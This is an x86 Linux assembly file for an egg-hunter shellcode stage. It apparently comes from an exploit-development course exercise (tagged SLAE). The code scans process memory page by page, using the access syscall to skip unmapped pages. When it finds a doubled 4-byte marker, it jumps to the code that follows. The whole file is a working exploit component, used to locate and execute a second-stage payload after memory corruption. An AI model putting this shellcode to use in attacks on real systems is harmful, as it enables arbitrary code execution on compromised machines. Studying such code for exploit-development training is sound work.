; Egg Hunting shell
; Marker: 0xca,0x11,0xab,0x1e,0xca,0x11,0xab,0x1e
; Author: Ty Gast // SLAE-1461


global _start

section .text
_start:

  ; Stage 1 - the Egg Hunter
  xor ecx, ecx
  xor ebx, ebx
  mul ebx
newpage:
  or dx, 0xfff  
nextaddr:  
  inc edx
  lea ebx, [edx + 4]
  push byte 0x21
  pop eax
  int 0x80
  cmp al, 0xf2 
  je newpage
  mov edi, edx
  mov eax, 0x1eab11ca
  scasd
  jne nextaddr
  scasd
  jne nextaddr
  jmp edi
